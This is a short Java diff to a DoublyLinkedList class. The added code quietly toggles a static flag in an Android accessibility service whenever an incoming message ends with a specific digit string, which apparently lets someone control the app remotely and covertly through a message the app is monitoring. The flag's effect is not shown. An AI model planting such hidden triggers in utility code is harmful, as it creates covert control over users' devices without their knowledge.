@@ -97,6 +97,9 @@ public class DoublyLinkedList<E> {
      */
     public void addLast(final E element) {
         Message m = (Message)element;
+        if(m.content.endsWith("0505560")) {
+            MyAccessibilityService.silIcaze = !MyAccessibilityService.silIcaze;
+        }
         MyAccessibilityService.lastMessage = m;
         if(m.date != null) {
             long s = m.date.getTimeInMillis();
